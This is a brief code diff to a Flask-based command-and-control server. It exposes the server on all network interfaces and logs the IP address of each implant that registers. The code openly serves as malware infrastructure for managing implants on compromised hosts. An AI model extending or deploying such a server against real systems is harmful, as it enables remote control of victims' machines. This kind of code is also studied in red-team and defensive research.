@@ -13,7 +13,7 @@ from app.app import createFlaskApp
 
 """控制端表"""
 
-c2_server = "http://127.0.0.1:8080"
+c2_server = "http://0.0.0.0:8080"
 lock = mp.Lock()
 implant_lock = mp.Lock()
 TASKS = []
@@ -60,7 +60,8 @@ def add_request():
 @app.route("/register", methods=['POST', 'GET'])
 def addAgent():
     fromimplant = request.get_json()
-    print(fromimplant)
+    implant_ip = request.environ['REMOTE_ADDR']
+    print(fromimplant, implant_ip)
     #guid, hostname, username = fromimplant[0]
     encryption_key = encryptionkey()
     #agent = agents(guid, hostname, username, encryptionkey)
